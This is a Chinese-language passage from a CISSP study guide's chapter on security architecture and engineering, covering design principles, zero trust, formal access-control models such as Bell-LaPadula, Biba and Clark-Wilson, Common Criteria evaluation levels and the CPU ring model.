  \n### 第 4 章：领域 3：安全架构与工程\n\n## 摘要\n\n领域 3：安全工程代表了一个庞大而复杂的技术领域。本章介绍了云、虚拟化和微服务概念。除了机密性和完整性（这些概念在许多领域中均有阐述）之外，还描述了认证和不可否认性等关键加密概念。除了替换和置换等基础操作以及密码系统类型（对称、非对称和哈希）之外，本章还介绍了对称密码系统的关键运行模式：电子密码本（`ECB`）、密码分组链接（`CBC`）、密码反馈（`CFB`）、输出反馈（`OFB`）和计数器模式（`CTR`）。该领域最后一部分的目标是确保在考虑物理和环境安全时，人员安全是关键考量因素。为确保这种安全，需要了解可能对人员安全产生负面影响的常见问题，例如火灾、烟雾、洪水和毒素，并特别强调烟雾和火灾的探测与抑制。物理安全是本章的另一个主要焦点，重点关注物理访问控制事项，包括围栏、大门、灯光、摄像头、锁、人员锁（mantrap）和警卫。\n\
  \n### 关键词\n\n非对称加密；哈希函数；虚拟机监视器；人员锁；尾随；对称加密；零信任架构\n\n本章涵盖的考试目标：\n\n*   安全设计原则\n*\
  \   安全模型\n*   评估方法、认证和授权\n*   安全系统设计概念\n*   安全硬件架构\n*   安全操作系统和软件架构\n*   虚拟化、云和分布式计算\n\
  *   系统漏洞、威胁和对策\n*   基石加密概念\n*   密码学类型\n*   密码攻击\n*   实施密码学\n*   外围防御\n*   场地选择、设计和配置\n\
  *   系统防御\n*   环境控制\n\n## 独特术语和定义\n\n*   **非对称加密** — 使用两个密钥的加密：如果用其中一个加密，则可用另一个解密\n\
  *   **哈希函数** — 使用算法且无需密钥的单向加密\n*   **虚拟机监视器** — 允许多个虚拟操作系统客户机在一台主机上运行\n*   **人员锁**\
  \ — 一种预防性物理控制，带有两扇门。每扇门都需要单独的认证形式才能打开\n*   **尾随** — 未提供凭证即跟随授权人员进入建筑物\n*   **对称加密**\
  \ — 使用一个密钥进行加密和解密的加密\n*   **零信任架构** — 将内部和外部系统均视为不可信的现代设计原则\n\n## 介绍\n\n\n\n\n##\
  \ 安全架构与工程\n\n安全架构与工程领域是考试将旧版 10 个领域的概念重新排序并合并为当前 8 个领域的一个典型例子。该领域包含了三个以前独立领域的大量内容：安全架构、密码学和物理安全。因此，该领域规模相当大，内容丰富。\n\
  \n正如第 1 章“简介”中所述，新的顺序并不总是符合逻辑流程，但这对考试成功并不重要。最终你将面对来自所有 8 个领域的问题，且问题不会明显引用其来源领域。\n\
  \n本领域从安全设计原则开始，包括威胁建模、纵深防御、零信任等。随后是安全架构概念，包括安全模型，以及硬件和软件中的安全系统组件。接下来是密码学，包括对称加密、非对称加密和哈希函数的核心概念。最后，我们将讨论物理安全，了解人员安全至上。\n\
  \n### 安全设计原则\n\n我们将首先讨论安全设计原则，重点介绍保护系统的现代方法。旧式的“城堡围墙”设计（坏东西在外面，好东西在里面）已过时，且往往难以抵御现代对手。零信任是现代防御的关键组成部分，我们稍后将讨论。\n\
  \n#### 威胁建模\n\n威胁建模旨在正式描述系统可用的各种攻击向量，并有助于规划部署适当的缓解措施。OWASP 对威胁建模的描述如下：\n\n> *威胁建模旨在识别、沟通和理解威胁及缓解措施，背景是在保护有价值资产的语境下。*\n\
  >\n> *威胁模型是影响应用程序安全的所有信息的结构化表示。从本质上讲，它是通过安全视角审视应用程序及其环境的一种视图。*\n>\n> *威胁建模可应用于广泛的事物，包括软件、应用程序、系统、网络、分布式系统、物联网设备和业务流程。*\n\
  >\n> *威胁模型通常包括：*\n>\n> *   *待建模主题的描述*\n> *   *可在威胁形势变化时进行检查或质疑的假设*\n> *   *系统面临的潜在威胁*\n\
  > *   *可针对每个威胁采取的缓解措施*\n> *   *验证模型和威胁的方法，以及验证所采取行动成效的方法* [\\[1\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0010)。\n\
  \n#### 最小权限与纵深防御\n\n如前所述，最小权限意味着用户应仅被授予完成其工作所需的最低访问权限（授权），不能更多。知情需要比最小权限粒度更细：用户在访问特定信息前，必须有知晓该特定信息的必要性。纵深防御（也称为分层防御）应用多种保障措施（也称为控制：为降低风险而采取的措施）来保护资产。任何单一安全控制都可能失效；通过部署多重控制，可提高数据的机密性、完整性和可用性。\n\
  \n#### 安全默认值\n\n安全默认值（也称为默认安全）意味着操作系统和应用程序以安全状态部署。历史上，操作系统通常以（有时）高度不安全的状态部署，安装后需要进行加固。\n\
  \n例如：在 20 世纪 90 年代，Unix 和 Linux 系统通常默认启用十几个监听网络服务。由于这些系统*默认不安全*，系统管理员随后会通过禁用不必要的服务来加固系统。这引出一个问题：既然服务是不必要的，为什么默认启用它们？大多数\
  \ Linux 发行版现在采用安全默认值：Ubuntu Linux 22.04（桌面版）默认零监听网络服务。甚至 OpenSSH 守护进程默认也不安装（尽管在大多数服务器发行版上会自动安装）。\n\
  \n#### 隐私设计\n\n隐私设计与安全默认值类似，顾名思义，侧重于隐私。历史上，许多隐私控制（如手机上的控制）默认禁用，要求用户选择退出共享数据给广告商等做法。隐私设计要求此类控制默认启用，允许用户选择加入共享数据给广告商（如果他们愿意）。\n\
  \n德勤将隐私设计描述为“一个基于主动将隐私嵌入 IT 系统、网络基础设施和业务实践的设计与运营中的框架”[\\[2\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0015)，并阐述了隐私设计的七大基础原则：\n\
  \n1.  **主动而非被动——预防而非补救**\n    *   在入侵性事件发生前预判、识别并预防；这意味着事前采取行动，而非事后。\n2.  **以隐私作为默认设置**\n\
  \    *   确保个人数据在所有 IT 系统或业务实践中自动受到保护，无需任何个人采取额外行动。\n3.  **将隐私嵌入设计**\n    *   隐私措施不应是附加组件，而应是系统的完全集成组件。\n\
  4.  **保持全功能（正和，而非零和）**\n    *   隐私设计采用“双赢”方法实现所有合法的系统设计目标；即隐私和安全都很重要，无需做出不必要的权衡即可两者兼得。\n\
  5.  **确保端到端安全**\n    *   数据生命周期安全意味着所有数据应按需安全保留，并在不再需要时销毁。\n6.  **保持可见性和透明度——公开透明**\n\
  \    *   向利益相关者保证业务实践和技术按目标运行，并接受独立验证。\n7.  **尊重用户隐私——以用户为中心**\n    *   保持以用户为中心；个人隐私利益必须由强有力的隐私默认值、适当的通知和用户友好的选项来支持\
  \ [\\[2\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0015)。\n\n#### 安全失效\n\n\
  顾名思义，安全失效意味着系统在发生故障时保持安全状态。设想一栋配有电子锁的建筑：发生停电时，门锁应在断电时保持锁定，还是解锁？安全失效要求它们保持锁定。\n\n\
  UNIX/Linux 系统使用 `fsck` 命令（文件系统检查）来修复受损磁盘。重启后，`fsck` 可检查受损磁盘扇区，并尝试自动修复。若修复失败，许多系统将在控制台终端打开一个\
  \ root（超级用户）会话（无需认证）。这是设计使然：若磁盘受损，认证可能变得不可能（因登录程序损坏、密码文件损坏等）。这是不安全失效的一个例子：安全失效将在所有情况下要求认证。\n\
  \n###### 职责分离\n\n正如我们将在第 8 章“领域 7：安全运营”中讨论的，职责分离要求多人共同完成关键或敏感交易。职责分离的目标是确保要想滥用对敏感数据或交易的访问权限，必须说服另一方共同行动。串通是指双方密谋破坏交易安全的行为。职责分离的经典动作电影案例涉及两把钥匙、一艘核潜艇和一名叛变舰长。\n\
  \n#### 保持简单\n\n\n\n#### 保持简单\n\n**保持简单**也称为“KISS 原则”（“Keep it Simple, Stupid”的缩写，或更礼貌地说：“Keep\
  \ it Simple, Silly”）。简单的系统比复杂的系统更安全。正如我们将在第 9 章“领域 8：软件开发安全”中讨论的那样，程序员通常每千行代码会犯\
  \ 15 到 50 个错误（除非他们接受过编写安全代码的正式培训），而更多的代码行意味着更多的 Bug。引用 Bruce Schneier 的话：“安全性最可怕的敌人是复杂性”[\\\
  [3\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0020)。\n\nKISS 原则由 Lockheed\
  \ Martin 的工程师 Kelly Johnson 在 1960 年代提出。在越战期间，飞机有时在野外维修，需要简单的工具和技术来修复它们：\n\n> 该原则最好用\
  \ Johnson 的故事来阐述：他给一组设计工程师一把工具，要求他们设计的喷气式飞机必须能由普通机械师在战场条件下仅用这些工具在野外修复。因此，“stupid（愚蠢）”指的是事物损坏的方式与可用的修复复杂程度之间的关系。该首字母缩略词已被美国空军和软件开发领域的许多人使用[\\\
  [4\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0025)。\n\n#### 信任，但要验证\n\n\
  “信任，但要验证”是一句俄罗斯谚语（*Doveryai, no proveryai*），由 Ronald Reagan 在 1980 年代推广。该术语现在用于描述一种依赖问责制和完整性的安全模型。信任，但要验证侧重于所有访问（本地和远程）的双因素认证、日志记录以及确保日志的完整性。它比零信任更简单（因此更容易且更便宜地实现），并且其“信任”部分与零信任直接冲突（零信任常被描述为“永不信任，始终验证”[\\\
  [5\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0030)，我们将在下一节讨论）。\n\nAydan\
  \ R. Yumerefendi 和 Jeffrey S. Chase 对“信任，但要验证”进行了描述：\n\n- **不可否认。** 可问责主体的行为是可证明且不可抵赖的。也就是说，服务或其客户无法合理地否认其行为，且这些行为可能具有法律约束力。\n\
  - **可认证。** 客户端、对等方或外部审计员可以验证可问责服务的行为是否正确，并向任意第三方证明任何不当行为。例如，可能会提示服务以密码学方式证明其行为符合其定义的语义，由其客户端发出的操作序列所证明。\n\
  - **可篡改性。** 任何破坏服务状态的尝试都会以高概率被检测到。特别是，外部审计员可以确定内部状态是否可能由在服务上发出的操作序列导致[\\[6\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0035)。\n\
  \n#### 零信任\n\n**零信任**（也称为零信任架构，或 ZTA）是对经典边界防火墙设计的反应。那种（过时的）模型使用了城堡围墙的隐喻：防火墙外部是不受信的，内部（防火墙后面）是受信的。双因素认证和加密通常用于远程访问，但不用于内部访问（因为内部被信任）。这种设计导致了扁平网络，内部网络几乎没有或完全没有过滤。这种设计的问题在于，大多数网络在某个时刻都会遭受入侵，而在受信的扁平网络上，恶意软件和恶意行为者的传播速度要快得多。\n\
  \n零信任有三个核心概念：\n\n- **确保无论位置如何，所有资源都能被安全访问**\n- **采用最小权限策略并严格实施访问控制**\n- **概念#3—检查并记录所有流量**\
  \ [\\[7\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0040)\n\n零信任可以总结为“永不信任，始终验证”[\\\
  [5\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0030)。每个设备都被视为不受信，无论本地还是远程。所有进出每个系统的流量都必须经过过滤（这称为微隔离）。所有网络流量都必须加密。所有情况下都必须使用多因素认证。图\
  \ 4.1 显示了一个 NIST 图表，说明了经典边界设计与零信任的区别。\n\n![图 4.1 传统架构与零信任架构对比 [8]。](images/B9780443187346000076/f04-01-9780443187346.jpg)\n\
  \n图 4.1 传统架构与零信任架构对比 [\\[8\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0045)。\n\
  \nForrester 分析师 John Kindervag 于 2009 年将零信任概念正式化：\n\n> 我创建了零信任概念，其核心原则是：无论网络用户、数据包、接口或设备是位于网络内部还是外部，都不应被信任。有些人错误地认为零信任是让系统变得可信，但实际上它涉及从网络安全策略中消除信任的概念。通过这样做，每个用户、数据包、网络接口和设备都被授予相同的默认信任级别：零[\\\
  [9\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0050)。\n\n**软件定义网络（SDN）**（在第\
  \ 5 章“领域 4：通信和网络安全”中讨论）等技术可用于实现零信任。\n\n### 安全模型\n\n安全模型为安全操作系统提供了“行车规则”。典型示例是**Bell-LaPadula**，它包含“不读上”（NRU），也称为简单安全属性。这是一条禁止机密级主体读取绝密级对象的规则。虽然\
  \ Bell-LaPadula 侧重于保护机密性，但其他模型（如**Biba**）则侧重于完整性。\n\n#### 向下读和向上写\n\n向下读和向上写的概念适用于\
  \ Bell-LaPadula 等强制访问控制模型。向下读发生在主体读取较低敏感级别的对象时，例如绝密级主体读取机密级对象。图 4.2 展示了此操作。\n\n\
  ![图 4.2 向下读。](img/f04-02-9780443187346.jpg)\n\n图 4.2 向下读。\n\n有时主体拥有信息，并将该信息传递给敏感级别高于主体访问权限的对象。这称为“向上写”，因为主体看不到对象中包含的任何其他信息。\n\
  \n向上写似乎违反直觉。正如我们稍后将看到的，这些规则保护机密性，往往以牺牲完整性为代价。想象一名机密级特工在实地发现了一个恐怖阴谋。该特工撰写了一份报告，其中包含可能对国家安全造成极其严重损害的信息。因此，该特工将报告标记为绝密（向上写）。图\
  \ 4.3 展示了此操作。向上读和向下写的唯一区别在于信息传递的方向。这是 CISSP®考试中一个微妙但重要的区别。\n\n![图 4.3 向上写。](img/f04-03-9780443187346.jpg)\n\
  \n图 4.3 向上写。\n\n> **注意**\n\n\n\n美国中央情报局（CIA）或任何其他政府秘密组织，均采用 `write up` 概念开展情报收集工作。特工外出收集少量情报数据，然后将这些数据发回总部。只有在总部，数据被汇总并整体审查后，数据的真实效用和价值才会显现。`最终对象的敏感度将远高于任何特工的访问级别。`\n\
  \n#### 状态机模型\n\n状态机模型是一种数学模型，它将所有可能的系统事件（称为状态）进行分组。会对系统的每一个可能状态进行评估，展示主体与客体之间所有可能的交互。如果每个状态都被证明是安全的，则该系统被证明是安全的。\n\
  \n当必须记录已识别的状态及其从一种状态向另一种状态转换的方式时，状态机可用于对现实世界的软件进行建模。例如，在面向对象编程中，状态机模型可用于模拟和测试对象如何从非活动状态转移到可随时接受输入并提供输出的活动状态。\n\
  \n#### Bell-LaPadula 模型\n\n`Bell-LaPadula` 模型最初是为美国国防部开发的。它专注于维护客体的机密性。保护机密性意味着`不`允许较低安全级别的用户访问较高安全级别的客体。Bell-LaPadula\
  \ 通过遵循两条规则运作：简单安全属性和 `*` 安全属性。\n\n##### 简单安全属性\n\n`简单安全属性` 规定“不得上读”：特定密级的主体不能读取更高密级的客体。例如，拥有“机密”许可的主体无法访问“绝密”客体。\n\
  \n##### *安全属性（星号安全属性）\n\n`* 安全属性` 规定“不得下写”：较高密级的主体不能写入较低密级。例如：登录到“绝密”系统的主体无法向“机密”系统发送电子邮件。\n\
  \n##### 强静止属性与弱静止属性\n\n在 Bell-LaPadula 访问控制模型中，有两个属性规定了系统如何为客体发布安全标签。`强静止属性` 规定安全标签在系统运行期间不会改变。`弱静止属性`\
  \ 规定安全标签不会以违背已定义安全属性的方式改变。\n\n#### 基于格的访问控制\n\n`基于格的访问控制` 允许对复杂环境实施安全控制。对于主体和客体之间的每一种关系，系统都会实施定义好的上限和下限访问权限。这种格结构允许到达更高和更低的数据分类级别，它取决于主体的需求、客体的标签以及分配给主体的角色。基于其在格中的位置，主体对客体拥有最小上界（LUB）和最大下界（GLB）的访问权限。图\
  \ 4.4 展示了一个基于格的访问控制模型示例。在最高访问级别处是标记为“{Alpha, Beta, Gamma}”的方框。处于此级别的主体可访问格中的所有客体。在格的第二层，我们看到每个客体都有各自不同的上限和下限。例如，假设某主体拥有“{Alpha,\
  \ Gamma}”访问权限。该格中唯一可视的客体将是“Alpha”和“Gamma”客体。两者均代表最大下边界。该主体将无法查看客体 Beta。\n\n![图 4.4\
  \ 基于格的访问控制。](img/f04-04-9780443187346.jpg)\n\n图 4.4 基于格的访问控制。\n\n#### 完整性模型\n\n\
  诸如 Bell-LaPadula 之类的模型专注于机密性，有时以牺牲完整性为代价。Bell-LaPadula 的“不得下写”规则意味着主体可以上写：机密主体可以写入绝密客体。如果机密主体向绝密客体写入错误信息怎么办？Biba\
  \ 等完整性模型解决了这一问题。\n\n##### Biba 模型\n\n虽然许多政府主要关注机密性，但大多数企业希望确保信息完整性得到最高级别的保护。当完整性保护至关重要时，`Biba`\
  \ 是首选模型。Biba 模型以 Kenneth J. Biba 命名，有两条主要规则：简单完整性公理和 `*` 完整性公理。\n\n###### 简单完整性公理\n\
  \n简单完整性公理是“不得下读”：特定分类级别的主体不能`读取`较低分类级别的数据。这可防止主体访问较低完整性级别的信息。这通过防止坏信息从较低完整性级别向上移动来保护完整性。\n\
  \n###### * 完整性公理\n\n`* 完整性公理` 是“不得上写”：特定分类级别的主体不能`写入`较高分类级别的数据。这可防止主体将信息传递到其无权更改的更高完整性级别。这通过防止坏信息移动到较高完整性级别来保护完整性。\n\
  \n> **注意**\n>\n> Biba 采用 Bell-LaPadula 规则并将其反转，展示了机密性和完整性通常是相互冲突的。如果你理解 Bell-LaPadula（不得上读；不得下写），则可以通过反转规则来推导\
  \ Biba：不得下读；不得上写。\n\n##### Clark-Wilson 模型\n\nClark-Wilson 是一种现实世界的完整性模型，它通过要求主体经由程序访问客体来保护完整性。由于程序对能对客体做什么和不能做什么有具体限制，Clark-Wilson\
  \ 有效地限制了主体的能力。Clark-Wilson 使用两个主要概念来确保安全策略得到执行：格式良好的事务和职责分离。\n\n###### 格式良好的事务\n\
  \n`格式良好的事务` 描述了 Clark-Wilson 对应用程序实施控制的能力。此过程由“访问控制三元组”组成：用户、转换过程和受限数据项。\n\n转换过程（TP）是一个格式良好的事务，受限数据项（CDI）是需要完整性的数据。非受限数据项（UDI）是不需要完整性的数据。保证基于完整性验证过程（IVP），确保数据保持在有效状态。\n\
  \n对于每个 TP，都会生成一条审计记录并录入访问控制系统。这在完整性丢失时提供了`检测`和`恢复`控制。\n\n###### 认证、执行与职责分离\n\n在\
  \ Clark-Wilson 中，认证监控完整性，执行保持完整性。所有关系必须满足职责分离施加的要求。所有 TP 必须记录足够的信息以重构数据事务，从而确保完整性。\n\
  \n> **考试警告**\n>\n> Clark-Wilson 要求用户被授权访问和修改数据。它还要求数据仅以授权方式被修改。\n\n\n\n\n\nClark-Wilson\
  \ 模型中职责分离的目的是确保授权用户不会以不当方式更改数据。一个例子是学校的财务处。一个部门负责收取款项，另一个部门负责发放付款。收款部门和付款部门均无权发起采购订单。通过将这三个角色保持分离，学校确保没有任何单个人能够欺诈性地收取、订购或花费资金。学校依赖链条上每个人的诚实和胜任能力来报告订单、付款或收款的任何不当修改。这需要所有相关方串谋才能实施欺诈行为。\n\
  \n**考试警告**\n\nClark-Wilson 在系统中强制执行 `separation of duties`（职责分离）和 `transformation\
  \ procedures`（转换过程）的概念。\n\n#### 信息流模型\n\n信息流模型描述了信息在安全系统中如何流动。Bell-LaPadula 和 Biba\
  \ 均使用信息流模型。Bell-LaPadula 规定“不读上”和“不写下”。信息流描述了非机密数据如何可被读取上升至机密级，例如，然后再写入上升至绝密级。Biba\
  \ 反转信息流路径以保护完整性。\n\n#### 中墙模型\n\n中墙模型旨在通过禁止一个人（如顾问）访问多个利益冲突类别来避免利益冲突。它也称为 Brewer-Nash\
  \ 模型，以模型创建者 David Brewer 博士和 Michael Nash 博士命名，最初旨在解决在银行和金融机构雇佣顾问工作所固有的风险 [\\[10\\\
  ]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0055)。\n\n利益冲突涉及访问直接竞争公司的敏感信息。如果顾问能访问竞争银行的利润率，他或她可能利用该信息谋取私利。中墙模型要求识别\
  \ CoIs，以便一旦顾问获得对某个 CoI 的访问权限，他们就无法读取或写入对立的 CoI [\\[10\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0055)。\n\
  \n#### 非干扰\n\n非干扰模型确保不同安全域的数据彼此保持分离。通过实施此模型，组织可以确保隐蔽信道通信不会发生，因为信息无法跨越安全边界。每次数据访问尝试都是独立的，与任何其他数据访问尝试无关。\n\
  \n隐蔽信道是对数据系统所有者或用户隐藏的、违反策略的通信。例如，TCP/IP 头部中存在未使用的字段，可用于隐蔽信道。这些字段还可以携带隐蔽流量，以及数据包内加密的载荷数据。许多类型的恶意软件使用这些字段作为隐蔽信道，与恶意软件命令与控制网络通信。\n\
  \n#### Take-Grant\n\n`Take-Grant Protection Model`（取授保护模型）包含控制主体与客体之间交互以及主体可授予其他主体权限的规则。规则包括：`take`（取）、`grant`（授）、`create`（创建）和\
  \ `remove`（移除）。这些规则被描绘为一张保护图，用于管控允许的操作 [\\[11\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0060)。每个主体和客体都将在图上表示。图\
  \ 4.5 详细描述了用户 Alice、Bob 和 Carol 之间关于各主体访问客体“机密文档”的取授关系。位于图中间的主体 Alice 可以对机密文档创建和移除\
  \ (`c, r`) 任何特权。Alice 还可以授予 (`g`) 用户 Carol 这些相同的任何特权。用户 Bob 可以取 (`t`) 用户 Alice 的任何特权。\n\
  \n![Fig. 4.5 The take-grant model.](img/f04-05-9780443187346.jpg)\n\n图 4.5 Take-Grant\
  \ 模型。\n\nTake-Grant 模型可能非常复杂，因为主体和客体之间的关系通常比此处所示的要复杂得多。\n\n#### 访问控制矩阵\n\n访问控制矩阵是一个定义特定主体和客体之间访问权限的表。矩阵是一种作为操作系统表查找的数据结构。例如，表\
  \ 4.1 是一个按用户定义特定访问权限的矩阵，详述了他们可以执行的操作。用户 `rdeckard` 对数据文件拥有读/写访问权限，也拥有对数据创建应用程序的访问权限。用户\
  \ `etyrell` 可读取数据文件，仍拥有对应用程序的访问权限。用户 `rbatty` 在此数据访问矩阵中无任何访问权限。\n\n表 4.1\n\n用户访问权限。\n\
  \n| Users | Data Access File # 1 | Data Creation Application |\n| --- | --- | ---\
  \ |\n| rdeckard | Read/Write | Execute |\n| etyrell | Read | Execute |\n| rbatty\
  \ | None | None |\n\n表 4.1 的行显示每个主体的能力；每行称为能力列表。表 4.1 的列显示每个客体或应用程序的访问控制列表。\n\n\
  #### 企业架构 Zachman 框架\n\n企业架构 `Zachman Framework`（Zachman 框架）提供了六个框架来提供信息安全，询问是什么、怎么做、在哪里、谁、何时和为什么，并将这些框架映射到规则中，包括规划者、所有者、设计师、建设者、程序员和用户。这些框架和角色映射到一个矩阵中，如\
  \ 图 4.6 所示。\n\n![Fig. 4.6 Zachman Framework. Source: https://commons.wikimedia.org/wiki/File:The\\\
  _Zachman\\_Framework\\_of\\_Enterprise\\_Architecture.jpg; Image by: Ideasintegration,\
  \ text by: SunSw0rd(text)/Wikimedia Commons. Image under permission of Creative\
  \ Commons Attribution-Share Alike 3.0 Unported.](img/f04-06-9780443187346.jpg)\n\
  \n图 4.6 Zachman 框架。来源：[`commons.wikimedia.org/wiki/File:The\\_Zachman\\_Framework\\\
  _of\\_Enterprise\\_Architecture.jpg`](https://commons.wikimedia.org/wiki/File:The_Zachman_Framework_of_Enterprise_Architecture.jpg)；图片由：Ideasintegration，文字由：SunSw0rd(text)/Wikimedia\
  \ Commons。图片遵循 Creative Commons Attribution-Share Alike 3.0 Unported 许可。\n\n####\
  \ Graham-Denning 模型\n\n`Graham-Denning Model`（Graham-Denning 模型）包含三部分：客体、主体和规则。它为主体和客体之间的交互提供了更细粒度的方法。共有八条规则：\n\
  \n*   R1：传送访问权\n*   R2：授予访问权\n*   R3：删除访问权\n*   R4：读取客体\n*   R5：创建客体\n*   R6：销毁客体\n\
  *   R7：创建主体\n*   R8：销毁主体 [\\[12\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0065)\n\
  \n#### Harrison-Ruzzo-Ullman 模型\n\n`Harrison-Ruzzo-Ullman` (HRU) 模型将主体、客体和访问权映射到访问矩阵。它被视为\
  \ Graham-Denning 模型的一种变体。HRU 有六种基本操作：\n\n*   创建客体\n*   创建主体\n*   销毁主体\n*   销毁客体\n\
  *   将权限加入访问矩阵\n*   从访问矩阵中删除权限 [\\[13\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0070)\n\
  \n除了 HRU 不同的操作外，它与 Graham-Denning 的区别还在于它将主体也视为客体。\n\n### 评估方法、认证和授权\n\n\n\n\n\n\
  #### 评估方法与标准\n\n评估方法和标准旨在衡量系统和产品的现实安全性。*可信计算机系统评估标准*（TCSEC，即橙皮书）是评估模型的鼻祖，由美国国防部于\
  \ 20 世纪 80 年代开发。随后出现了其他国际模型，包括 ITSEC（欧洲*信息技术安全评估标准*）和通用标准。\n\n在选择安全产品时，如何知道哪个最好？安全专业人员如何知道选择并使用特定供应商的软件不会引入恶意代码？安全专业人员如何了解软件测试得如何以及测试结果是什么？TCSEC\
  \ 和 ITSEC 曾是这些问题的答案。通用标准是这些问题的较新答案，因此我们接下来将重点关注它。\n\n##### 国际通用标准\n\n*国际通用标准*是一项国际商定的标准，用于描述和测试\
  \ IT 产品的安全性。它旨在避免超出当前最先进技术水平的要求，并为一系列分类和系统提供了需求层级。通用标准是继 ITSEC 之后的第二个主要国际信息安全标准工作。通用标准使用了\
  \ ITSEC 的术语，如评估对象和安全目标。\n\n通用标准的开发旨在评估商业现成的以及政府设计和构建的信息保障（IA）和支持 IA 的 IT 产品。通用标准的一个主要目标是消除待测试目标的已知漏洞。\n\
  \n###### 通用标准术语\n\n通用标准在定义测试过程的特定部分时使用特定术语。\n\n*   **评估对象**：正在被评估的系统或产品\n*   **安全目标**：描述\
  \ TOE 的文档，包括安全需求和运行环境\n*   **保护配置文件**：针对特定类别产品或系统（如防火墙或入侵检测系统）的一组独立的安全需求和目标\n* \
  \  **评估保证级别**：经过测试的产品或系统的评估分数\n\n###### 评估级别\n\n在通用标准中，共有七个 EAL 级别；每一级都建立在对前一级进行深入审查的基础之上\
  \ [\\[14\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0075)。例如，EAL3 级产品预期可满足或超过\
  \ EAL1 或 EAL2 级产品的要求。\n\nEAL 级别在《信息技术安全评估通用标准，第 3 部分：安全保证组件》（2009 年 7 月，版本 3.1，修订版\
  \ 3，最终版，可在以下网址获取：[`www.commoncriteriaportal.org/files/ccfiles/CCPART3V3.1R3.pdf`](http://www.commoncriteriaportal.org/files/ccfiles/CCPART3V3.1R3.pdf)）中进行了描述。这些级别包括：\n\
  \n*   **EAL1**：功能测试\n*   **EAL2**：结构测试\n*   **EAL3**：系统地测试和检查\n*   **EAL4**：系统地设计、测试和评审\n\
  *   **EAL5**：半正式地设计和测试\n*   **EAL6**：半正式地验证、设计和测试\n*   **EAL7**：正式地验证、设计和测试 [\\\
  [14\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0075)\n\n### 安全系统设计概念\n\n\
  安全系统设计超越了特定的硬件和软件实现，代表了通用的最佳实践。\n\n#### 分层\n\n*分层*将硬件和软件功能分离为模块化层级。诸如从磁盘驱动器读取扇区这类问题的复杂性被限制在一层内（本例中为硬件层）。一层（如应用层）不会直接受到另一层变更的影响。从\
  \ `IDE`（集成驱动器电子设备）磁盘驱动器更换为 `SCSI`（小型计算机系统接口）驱动器，不会影响保存文件的应用程序。这些细节包含在一层内，可能仅影响相邻层。\n\
  \n`OSI` 模型（我们将在第 5 章，领域 4：通信与网络安全中讨论）是网络分层的一个示例。与 `OSI` 模型不同，安全架构的层没有适用于所有架构的通用标准名称。安全架构层的通用列表如下：\n\
  \n1.  硬件\n2.  `内核` 和设备驱动程序\n3.  `操作系统`\n4.  应用程序\n\n在我们之前的 `IDE` → `SCSI` 驱动器示例中，硬件层中的磁盘驱动器已从\
  \ `IDE` 变更为 `SCSI`。相邻层中的设备驱动程序也将随之变更。其他层（如应用层）保持不变。\n\n#### 抽象\n\n*抽象*向用户隐藏不必要的细节。复杂性是安全的敌人：流程越复杂，安全性越低。话虽如此：计算机是极其复杂的机器。抽象提供了一种管理这种复杂性的方法。\n\
  \n用户双击一个包含音乐的 `MP3` 文件，音乐通过计算机扬声器播放。在后台，正在发生极其复杂的操作：操作系统打开 `MP3` 文件，查找与之关联的应用程序，并将比特发送给媒体播放器。比特由媒体播放器解码，转换为数字流，并发送给声卡。声卡将流转换为声音并发送给扬声器输出设备。最后，扬声器播放声音。在声音播放时，数百万次计算正在发生，同时正在访问底层设备。\n\
  \n抽象意味着用户只需按下播放键即可听到音乐。\n\n#### 安全域\n\n*安全域*是主体被允许访问的对象列表。更广泛地定义，域是具有相似安全需求的主体和对象的组合。例如，机密、秘密和绝密是美国国防部（DoD）使用的三个安全域。就内核而言，两个域分别是用户模式和内核模式。\n\
  \n内核模式（也称为管理员模式）是内核所在的位置，允许对 `内存`、`CPU`、磁盘等进行低级访问。它是系统中最受信任、权力最大的部分。用户模式是用户账户及其进程所在的位置。这两个域是分离的：用户模式下的错误或安全疏漏不应影响内核。大多数现代操作系统都使用这两种模式；一些较简单的（如嵌入式）和较旧的（如\
  \ Microsoft `DOS`）操作系统完全运行在内核模式下。\n\n#### 环模型\n\n*环模型*是一种 CPU 硬件分层形式，用于将域（如内核模式和用户模式）相互分离和保护。许多\
  \ CPU（如 Intel `×86` 系列）有四个环，从环 0（内核）到环 3（用户），如图 4.7 所示。最内层的环最受信任，每一层向外的环信任度依次降低。\n\
  \n![图 4.7 环模型。](img/f04-07-9780443187346.jpg)\n\n图 4.7 环模型。\n\n这些环（理论上）的用途如下：\n\n\
  *   **环 0**：内核\n*   **环 1**：不适合环 0 的其他操作系统组件\n*   **环 2**：设备驱动程序\n*   **环 3**：用户应用程序\n\
  \n\n\n\n\n### 进程与系统调用\n\n*进程*通过*系统调用*在环之间进行通信，系统调用允许进程与内核通信，并提供了环之间的窗口。在 3 环运行文字处理器的用户按下“保存”：会发起一个进入\
  \ 0 环的系统调用，请求内核保存文件。内核执行保存操作，并报告文件已保存。系统调用较慢（与在单个环内执行工作相比），但提供了安全性。环模型还提供了抽象：保存文件的繁杂细节对用户隐藏，用户只需按下“保存”按钮即可。\n\
  \n虽然 ×86 CPU 有四个环，且可按上述方式使用，但这种用法被认为是理论上的，因为大多数 ×86 操作系统（包括 Linux 和 Windows）仅使用\
  \ 0 环和 3 环。以四个环为例，使用我们的“保存”文件示例，调用将从 3 环发往 2 环，然后从 2 环发往 1 环，最后从 1 环发往 0 环。这很安全，但复杂且缓慢，因此大多数现代操作系统选择简单性和速度。\n\
  \n一种称为*管理程序模式*（非正式称为“−1 环”）的较新模式允许虚拟客户机在 0 环中运行，受“下方”一个环的管理程序控制。`Intel VT`（Intel\
